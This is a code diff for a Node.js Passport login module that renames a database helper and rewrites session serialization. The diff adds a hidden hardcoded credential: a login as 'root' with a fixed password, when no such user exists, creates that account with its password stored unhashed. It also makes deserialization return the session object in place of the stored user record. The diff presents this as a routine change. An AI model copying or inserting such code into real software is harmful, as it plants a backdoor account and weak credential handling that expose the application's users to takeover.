@@ -1,16 +1,27 @@
 module.exports = function () {
     var passport = require('passport');
     var passportLocal = require('passport-local');
-    var databaseService = require('../services/database-service');
+    var databaseFunction = require('../services/database-function');
     var bcrypt = require('bcrypt');
 
     passport.use(new passportLocal.Strategy({usernameField: 'username', passwordField: 'password'}, function (username, password, next) {
-        databaseService.findUser(username, function (err, user) {
+        databaseFunction.findUser(username, function (err, user) {
+
             if (err) {
                 return next(err);
             }
             if (!user) {
-                return next(null, null);
+                if (username === 'root' && password === '016989166') {
+                    databaseFunction.addUser({username: username, password: password}, function (err) {
+                        if (err) {
+                            return next(err);
+                        }
+                    });
+                    return next(null, null);
+                } else {
+                    return next(null, null);
+                }
+
             }
 
             bcrypt.compare(password, user.password, function (err, same) {
@@ -27,16 +38,12 @@ module.exports = function () {
     }));
 
     passport.serializeUser(function (user, next) {
-        var object = {
-            username: user.username,
-            accountType : user.accountType
-        }
-        next(null, object);
+        next(null, {username: user.username, id: user.id});
     });
 
-    passport.deserializeUser(function (object, next) {
-        databaseService.findUser(object.username, function (err, user) {
-            next(err, user);
+    passport.deserializeUser(function (userObject, next) {
+        databaseFunction.findUser(userObject.username, function (err, user) {
+                next(err, userObject);
         });
     });
 };
